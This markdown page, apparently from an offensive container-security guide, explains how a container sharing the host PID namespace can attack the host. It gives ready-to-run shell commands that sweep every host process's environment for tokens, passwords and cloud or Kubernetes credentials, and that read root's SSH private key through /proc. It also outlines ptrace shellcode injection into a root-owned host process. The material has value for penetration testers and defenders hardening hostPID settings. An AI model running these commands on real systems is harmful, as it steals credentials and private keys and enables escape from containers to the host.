---
title: "Host PID namespace: operating on host processes from the container"
order: 1
description: "A container sharing the host PID namespace sees every host process in its own /proc. That exposes host command lines, environment variables, open file descriptors, and process roots for secret harvesting, and, combined with ptrace permission, allows injecting code into a root-owned host process to execute on the host."
keywords:
  - hostpid
  - pid namespace
  - process injection
  - proc environ
  - container escape
---

# Host PID namespace

With `--pid=host` or `hostPID: true`, the container's PID namespace is the host's, so `/proc` lists every host process. This has two consequences: all host process metadata becomes readable, and, where ptrace is permitted, host processes become injection targets. The first is a near-guaranteed secret-harvesting win; the second is a full escape when a capability or matching UID allows writing another process's memory.

Confirm the shared namespace:

```bash
readlink /proc/1/exe                        # host init path => host PID namespace
ls /proc | grep -E '^[0-9]+$' | wc -l       # host-wide process count
ps -ef | grep -vE '\]$' | head              # real host daemons listed
```

## Routes

```bash
# Harvest secrets from host process environments and command lines
for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null; done | \
  grep -iE 'token|secret|key|pass|aws|kube' | sort -u

# Reach another process's filesystem via its root symlink
cat /proc/<root_pid>/root/root/.ssh/id_ed25519 2>/dev/null

# Inject into a root host process (needs ptrace permission / CAP_SYS_PTRACE)
# seize -> overwrite code at rip via /proc/<pid>/mem -> detach to run shellcode
```

The environment-variable sweep alone frequently returns cloud credentials, database passwords, and service-account tokens that pivot to the host or cluster without any further escape.

## Exploitation notes

- Reading `environ`, `cmdline`, `fd`, and `root` of host processes needs only visibility plus, for other UIDs, sufficient privilege; it is low-noise information disclosure.
- Code injection into a host process additionally needs ptrace permission; pair with [CAP_SYS_PTRACE](../privileged-configuration/capability-abuse/cap-sys-ptrace.md). The mechanics are the same as the ptrace injection route, here enabled by the host processes being visible.
- In Kubernetes, `hostPID` pods commonly run alongside node daemons whose memory and environment hold kubelet or cloud credentials; see [Host namespaces](../../orchestration/kubernetes/pod-escape-to-node/host-namespaces.md).

## References

- [man 7 pid_namespaces](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html)
- [HackTricks: PID namespace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/pid-namespace)
